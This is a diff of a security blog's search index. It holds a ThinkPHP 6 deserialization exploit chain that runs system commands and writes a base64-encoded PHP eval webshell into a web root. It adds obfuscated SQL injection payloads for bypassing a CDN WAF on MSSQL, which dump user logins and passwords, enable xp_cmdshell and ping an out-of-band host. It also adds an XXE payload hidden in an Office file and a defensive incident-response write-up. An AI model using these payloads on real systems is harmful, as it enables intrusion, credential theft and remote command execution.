class="variable">$complete</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;key = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> \think\cache\Driver\<span class="title function_ invoke__">File</span>();</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;complete=[<span class="string">&quot;`whoami`&quot;</span>];</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">CacheStore</span>();</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">Driver</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$options</span> = [</span><br><span class="line"> <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line"> <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;hash_type&#x27;</span> =&gt; <span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"> <span class="string">&#x27;tag_prefix&#x27;</span> =&gt; <span class="string">&#x27;tag:&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;serialize&#x27;</span> =&gt; [],</span><br><span class="line"> ];</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>][<span class="number">0</span>] = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="EXP-2（文件写入操作，与上面大同小异，不做论述）："><a href="#EXP-2（文件写入操作，与上面大同小异，不做论述）：" class="headerlink" title="EXP_2（文件写入操作，与上面大同小异，不做论述）："></a>EXP_2（文件写入操作，与上面大同小异，不做论述）：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">filesystem</span>&#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">Psr</span>\<span class="title class_">SimpleCache</span>\<span class="title class_">CacheInterface</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">CacheStore</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$autosave</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$complete</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;key = <span class="string">&quot;shell&quot;</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> \think\cache\Driver\<span class="title function_ invoke__">File</span>();</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;expire = <span class="number">1</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;complete=<span class="string">&quot;aaaaPD9waHAgZXZhbCgkR0VUWyJjbWQiXSk7Pz4=&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">CacheStore</span>();</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">Driver</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$options</span> = [</span><br><span class="line"> <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"> <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=/var/www/html/thinkphp6.0-dev/public/&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;hash_type&#x27;</span> =&gt; <span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"> <span class="string">&#x27;tag_prefix&#x27;</span> =&gt; <span class="string">&#x27;tag:&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;serialize&#x27;</span> =&gt; [],</span><br><span class="line"> ];</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>] = [];</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.dazhuanlan.com/naiyouhzu/topics/1541898">https://www.dazhuanlan.com/naiyouhzu/topics/1541898</a></p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>反序列化</tag>
-        <tag>ThinkPHP</tag>
-        <tag>WEB安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hello World</title>
     <url>/2022/03/18/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -119,6 +119,108 @@
 <h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>应急响应之axis弱口令入侵</title>
+    <url>/2022/03/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8Baxis%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%85%A5%E4%BE%B5/</url>
+    <content><![CDATA[<h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p>5月14日晚20点16分，收到客户通知，服务器疑似存在恶意代码。表象为：该服务器从5月12日下午18点左右开始对其他服务器发起暴力破解攻击，包括 SSH、MSSQL 暴力破解活动。</p>
+<h2 id="0x02-事件处置"><a href="#0x02-事件处置" class="headerlink" title="0x02 事件处置"></a>0x02 事件处置</h2><h3 id="访谈用户"><a href="#访谈用户" class="headerlink" title="访谈用户"></a>访谈用户</h3><p><strong>访谈内容：</strong></p>
+<ol>
+<li>异常服务器基本信息，包括IP、用途、中间件、操作系统等？</li>
+<li>几时出现异常现场？</li>
+<li>异常情况是什么？</li>
+<li>遭受异常服务器攻击的受害者IP信息？</li>
+</ol>
+<h3 id="网络连接分析"><a href="#网络连接分析" class="headerlink" title="网络连接分析"></a>网络连接分析</h3><p>根据用户描述可知，异常服务器对受害者主机发起 SSH、MSSQL 暴力破解，在异常主机输入命令：netstat -anplt | grep 1433，发现存在多条目的端口为 1433 的网络连接信息，目的IP与受害者IP信息一致，程序 PID 为 5033，对应程序为 JAVA</p>
+<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>ps -aux | grep 5033 对应为 WEB 服务，猜测攻击者通过类似reGeorg 等工具代理流量，然后在本地发起暴力破解攻击。</p>
+<h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><p><code>find  web目录路径 -ctime（-mtime） -7  -type f</code> ，查找7日内新增、改变的文件并进行分析。发现多个文件，涉及类型有 aar 包，冰蝎木马，reGeorg 流量代理工具等。</p>
+<h3 id="WEB日志分析"><a href="#WEB日志分析" class="headerlink" title="WEB日志分析"></a>WEB日志分析</h3><h4 id="确认有哪些恶意文件？"><a href="#确认有哪些恶意文件？" class="headerlink" title="确认有哪些恶意文件？"></a>确认有哪些恶意文件？</h4><ol>
+<li>通过find命令查找7日、30日之内变更、新增的文件。</li>
+<li>通过河马、D盾对整个web目录进行扫描。</li>
+<li>对筛选出来的文件再次进行人工审查，初步确认存在3个恶意文件，分别为 skin.jsp（reGeorg）、help.jsp（reGeorg）、j2ee.jsp（冰蝎）。</li>
+</ol>
+<h4 id="确认有多少个IP访问过恶意文件？"><a href="#确认有多少个IP访问过恶意文件？" class="headerlink" title="确认有多少个IP访问过恶意文件？"></a>确认有多少个IP访问过恶意文件？</h4><p><code>grep -ie &quot;skin.jsp\|help.jsp\|j2ee.jsp&quot; localhost_access_log* | awk &#39;&#123;print $1&#125;&#39; | sort | uniq -c</code> ，发现共15个IP访问过恶意文件。</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>IP</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>112.96.67.7</td>
+</tr>
+<tr>
+<td>2</td>
+<td>13.234.116.183</td>
+</tr>
+<tr>
+<td>3</td>
+<td>58.62.206.235</td>
+</tr>
+<tr>
+<td>4</td>
+<td>58.62.206.249</td>
+</tr>
+<tr>
+<td>5</td>
+<td>112.96.195.23</td>
+</tr>
+<tr>
+<td>6</td>
+<td>120.235.159.163</td>
+</tr>
+<tr>
+<td>7</td>
+<td>120.239.76.89</td>
+</tr>
+<tr>
+<td>8</td>
+<td>223.104.66.68</td>
+</tr>
+<tr>
+<td>9</td>
+<td>112.96.193.140</td>
+</tr>
+<tr>
+<td>10</td>
+<td>120.235.159.189</td>
+</tr>
+<tr>
+<td>11</td>
+<td>120.235.159.246</td>
+</tr>
+<tr>
+<td>12</td>
+<td>223.104.63.106</td>
+</tr>
+<tr>
+<td>13</td>
+<td>45.66.134.61</td>
+</tr>
+<tr>
+<td>14</td>
+<td>112.96.173.19</td>
+</tr>
+<tr>
+<td>15</td>
+<td>117.136.41.37</td>
+</tr>
+</tbody></table>
+<h4 id="确认这些IP中第一个访问系统的IP是什么？"><a href="#确认这些IP中第一个访问系统的IP是什么？" class="headerlink" title="确认这些IP中第一个访问系统的IP是什么？"></a>确认这些IP中第一个访问系统的IP是什么？</h4><p><code>grep -m1  &quot;112.96.67.7/|13.234.116.183.....&quot;   localhost_access_log*</code>，发现58.62.206.249为第一个访问系统的IP，访问时间为：11&#x2F;May&#x2F;2021:12:15:23</p>
+<h4 id="确认这些IP访问过什么文件，发送过什么请求包？"><a href="#确认这些IP访问过什么文件，发送过什么请求包？" class="headerlink" title="确认这些IP访问过什么文件，发送过什么请求包？"></a>确认这些IP访问过什么文件，发送过什么请求包？</h4><ol>
+<li><code>grep -ie &quot;IP地址.*\s200\s.*&quot; localhost_access_log* | awk &#39;&#123;print $7&#125;&#39; |awk -F &#39;?&#39; &#39;&#123;print $1&#125;&#39; | sort | uniq -c | sort -rnk 1</code> ，查询成功访问的uri资源，发现对含有AxisInvoker的路径访问频繁; </li>
+<li><code>grep -ie &quot;IP地址.*AxisInvoker.*\s200\s.*&quot; localhost_access_log* | awk &#39;&#123;print $7&#125;&#39; | sort | uniq -c | sort -rnk 1</code> ，排查 AxisInvoker，检查方法参数，分析攻击者操作，发现该文件对应7天内新增的 AxisInvoker.aar 包，是后门程序，攻击者通过该后门程序写入skin.jsp（reGeorg）、help.jsp（reGeorg）、j2ee.jsp（冰蝎），反弹shell等。</li>
+</ol>
+<h4 id="确认什么时候第一次获取控制权？"><a href="#确认什么时候第一次获取控制权？" class="headerlink" title="确认什么时候第一次获取控制权？"></a>确认什么时候第一次获取控制权？</h4><ol>
+<li><code>grep -m1 -c10 -ie &quot;AxisInvoker&quot;  localhost_access_log*</code>，发现第一次出现 AxisInvoker 记录的 IP：<code>58.62.206.249</code>，出现时间：<code>11/May/2021:13:39:08</code>，对上一条日志记录为 <code>/r1/axis2-admin/upload</code></li>
+<li>检查第一次访问系统时间：<code>11/May/2021:12:15:23</code> 与第一次出现 AxisInvoker 记录：<code>11/May/2021:13:39:08</code> 之间的日志，未发现其他异常的情况。</li>
+<li>综上，判断攻击者登陆了 axis2 后台，并通过后台部署AxisInvoker.aar 包，获取控制权限，初次获取控制权限的时间为：<code>11/May/2021:13:39:08</code>。</li>
+</ol>
+<h2 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h2><p>经分析整理，本次信息安全事件是由 axis 管理后台存在弱口令漏洞导致。攻击者通过 axis 弱口令登录管理后台，在管理后台部署恶意aar包获取控制权限。后续则通过上传冰蝎木马，reGeorg 流量代理工具等进一步控制服务器并开展横向渗透攻击。
+ </p>
 ]]></content>
   </entry>
   <entry>
@@ -186,6 +288,74 @@
         <tag>WEB安全</tag>
         <tag>暴力破解</tag>
         <tag>AES</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>某CDN SQLi注入Bypass</title>
+    <url>/2022/03/19/%E6%9F%90CDN-SQLi%E6%B3%A8%E5%85%A5Bypass/</url>
+    <content><![CDATA[<h2 id="0x01-前言："><a href="#0x01-前言：" class="headerlink" title="0x01 前言："></a>0x01 前言：</h2><p>某次测试，发现目标存在 SQLi 注入漏洞，站点采用某信服CDN，且提供防护功能。由于无法找到真实IP地址，遂有本次测试。</p>
+<h2 id="0x02-Payload"><a href="#0x02-Payload" class="headerlink" title="0x02 Payload"></a>0x02 Payload</h2><p>目标站点信息一览表</p>
+<ul>
+<li>中间件：IIS</li>
+<li>数据库：MSSQL</li>
+<li>脚本语言：aspx</li>
+</ul>
+<h3 id="Payload："><a href="#Payload：" class="headerlink" title="Payload："></a>Payload：</h3><h4 id="绕过-union-selec-常规函数-："><a href="#绕过-union-selec-常规函数-：" class="headerlink" title="绕过 union selec+常规函数 ："></a>绕过 <code>union selec+常规函数</code> ：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2 union--^!~%*/%0b/*%0aall select--^!~%*/%0b%0anull,null,null,null,db_name--%0a(),2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="绕过-union-select-x-from-x-："><a href="#绕过-union-select-x-from-x-：" class="headerlink" title="绕过 union select x from x ："></a>绕过 <code>union select x from x </code>：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2 union--^!~%*/%0b/*%0aall(select--^!~%*/%0b/*%0anull,null,null,null,1,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b/*%0afrom--^!~%*/%0b/*%0ax)--</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="绕过-union-all-select-x-from-x-："><a href="#绕过-union-all-select-x-from-x-：" class="headerlink" title="绕过 union all select x from x ："></a>绕过 <code>union all select x from x</code> ：</h4><p><strong>查表名：</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2 union--^!~%*/%0b%0aall(--^!~%*/%0b%0aselect--^!~%*/%0b/*%0anull,null,null,null,name,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b%0afrom--/*^~%%0bx*/%0asysobjects)--</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>查字段名：</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b%0aall(--^!~%*/%0b%0aselect--^!~%*/%0b/*%0anull,null,null,null,COLUMN_NAME,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b%0afrom--/*^~%%0bx*/%0ainformation_schema.COLUMNS where TABLE_NAME=&#x27;</span>sys_User<span class="string">&#x27;)--</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>查数据：</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b%0aall(--^!~%*/%0b%0aselect--^!~%*/%0b/*%0anull,null,null,null,U_LoginName,U_Password ,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b%0afrom--/*^~%%0bx*/%0asys_User)--</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>开启xp_cmdshell：</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b/*%0aall%20select--^!~%*/%0b%0anull,null,null,null,SERVERPROPERTY--%0a(%27MachineName%27),2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null;EXEC--^!~%*/%0b%0asp_configure &#x27;</span><span class="keyword">show</span> advanced options<span class="string">&#x27;, 1;RECONFIGURE;EXEC--^!~%*/%0b%0asp_configure &#x27;</span>xp_cmdshell<span class="string">&#x27;, 1;RECONFIGURE;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>执行ping命令测试：</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b/*%0aall%20select--^!~%*/%0b%0anull,null,null,null,SERVERPROPERTY--%0a(%27MachineName%27),2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null;exec--^!~%*/%0b%0amaster..xp_cmdshell%20%27ping%20hn81hzwt1rqcgj20qnh50is0drjh76.burpcollaborator.net%27--</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>SQLi</category>
+      </categories>
+      <tags>
+        <tag>SQLi</tag>
+        <tag>注入</tag>
+        <tag>bypass</tag>
+        <tag>CDN</tag>
+        <tag>WAF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>通过 Office Open XML 解析器进行XXE攻击</title>
+    <url>/2022/03/18/%E9%80%9A%E8%BF%87-Office-Open-XML-%E8%A7%A3%E6%9E%90%E5%99%A8%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><h3 id="XXE-via-Office-Open-XML-Parsers"><a href="#XXE-via-Office-Open-XML-Parsers" class="headerlink" title="XXE via Office Open XML Parsers"></a>XXE via Office Open XML Parsers</h3><p>（复制自 <a href="https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/"><strong>here</strong></a>）<br>许多 Web 应用程序允许您上传 Microsoft Office 文档，然后后端会从中解析数据。例如，您可能有一个 Web 应用程序，允许您通过上传 XLSX 格式的电子表格来导入数据。在某些时候，为了让解析器从电子表格中提取数据，解析器需要<strong>parse at least one XML file</strong>.</p>
+<p>对此进行测试的唯一方法是生成一个包含 XXE 有效负载的 <strong>Microsoft Office 文件</strong>，所以让我们这样做。<br>首先，创建一个空目录来解压你的文档，然后解压！</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test$ ls</span><br><span class="line">test.docx</span><br><span class="line">test$ mkdir unzipped</span><br><span class="line">test$ unzip ./test.docx -d ./unzipped/</span><br><span class="line">Archive:  ./test.docx</span><br><span class="line">  inflating: ./unzipped/word/numbering.xml</span><br><span class="line">  inflating: ./unzipped/word/settings.xml</span><br><span class="line">  inflating: ./unzipped/word/fontTable.xml</span><br><span class="line">  inflating: ./unzipped/word/styles.xml</span><br><span class="line">  inflating: ./unzipped/word/document.xml</span><br><span class="line">  inflating: ./unzipped/word/_rels/document.xml.rels</span><br><span class="line">  inflating: ./unzipped/_rels/.rels</span><br><span class="line">  inflating: ./unzipped/word/theme/theme1.xml</span><br><span class="line">  inflating: ./unzipped/[Content_Types].xml</span><br></pre></td></tr></table></figure>
+
+<p>在您喜欢的文本编辑器 (vim) 中打开 <code>./unzipped/word/document.xml</code> 并编辑 <strong>XML 以包含您喜欢的 XXE 有效负载</strong>。我尝试的第一件事往往是 HTTP 请求，如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE x [ &lt;!ENTITY test SYSTEM &quot;http://[ID].burpcollaborator.net/&quot;&gt; ]&gt;</span><br><span class="line">&lt;x&gt;&amp;test;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这些行应该像这样插入到两个根 XML 对象之间，当然您需要将 URL 替换为可以监视请求的 URL：</p>
+<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png" alt="Those lines should be inserted in between the two root XML objects, like thi"></p>
+<p>剩下的就是<strong>压缩文件以创建恶意的 poc.docx 文件</strong>。从我们之前创建的“解压缩”目录中，运行以下命令：</p>
+<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png" alt="From the &quot;unzipped&quot; directory that we created earlier, run the following:"></p>
+<p>现在将文件上传到易受攻击的 Web 应用程序，并在 Burp Collaborator 日志监控是否收到请求。</p>
+<h2 id="0x02-通过上传Excel对网站进行XXE攻击"><a href="#0x02-通过上传Excel对网站进行XXE攻击" class="headerlink" title="0x02-通过上传Excel对网站进行XXE攻击"></a>0x02-通过上传Excel对网站进行XXE攻击</h2><h3 id="0x02-1-确认XXE"><a href="#0x02-1-确认XXE" class="headerlink" title="0x02-1 确认XXE"></a>0x02-1 确认XXE</h3><p>某次对项目网站进行测试，发现应用系统中提供多个上传接口，允许用户上传 Excel 文件并在后端对 Excel 文件进行数据解析导入。<br>根据 <code>0x01-前言</code> 提及的方法，对 Excel 解压，修改文件XML内容。第一次修改的文件为 <code>[Content_Types].xml</code> ，修改后重压缩文件为 xsls 文件并上传，测试后现XXE攻击失败。<br>后续将 <code>xl/workbook.xml</code>、<code>xl/worksheets/sheet1.xml</code>、<code>xl/theme/theme1.xml</code>的内容均作修改，插入 XXE PayLoad。重新上传修改后的 xsls 文件，成功触发 XXE漏洞。</p>
+<h3 id="0x02-2-读取文件"><a href="#0x02-2-读取文件" class="headerlink" title="0x02-2 读取文件"></a>0x02-2 读取文件</h3><p>还没来得及测试，对方已修复漏洞，bingo！！！</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>WEB安全</tag>
+        <tag>XXE</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -339,74 +509,6 @@
       <tags>
         <tag>应急响应</tag>
         <tag>非法入侵</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>某CDN SQLi注入Bypass</title>
-    <url>/2022/03/19/%E6%9F%90CDN-SQLi%E6%B3%A8%E5%85%A5Bypass/</url>
-    <content><![CDATA[<h2 id="0x01-前言："><a href="#0x01-前言：" class="headerlink" title="0x01 前言："></a>0x01 前言：</h2><p>某次测试，发现目标存在 SQLi 注入漏洞，站点采用某信服CDN，且提供防护功能。由于无法找到真实IP地址，遂有本次测试。</p>
-<h2 id="0x02-Payload"><a href="#0x02-Payload" class="headerlink" title="0x02 Payload"></a>0x02 Payload</h2><p>目标站点信息一览表</p>
-<ul>
-<li>中间件：IIS</li>
-<li>数据库：MSSQL</li>
-<li>脚本语言：aspx</li>
-</ul>
-<h3 id="Payload："><a href="#Payload：" class="headerlink" title="Payload："></a>Payload：</h3><h4 id="绕过-union-selec-常规函数-："><a href="#绕过-union-selec-常规函数-：" class="headerlink" title="绕过 union selec+常规函数 ："></a>绕过 <code>union selec+常规函数</code> ：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2 union--^!~%*/%0b/*%0aall select--^!~%*/%0b%0anull,null,null,null,db_name--%0a(),2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--</span></span><br></pre></td></tr></table></figure>
-
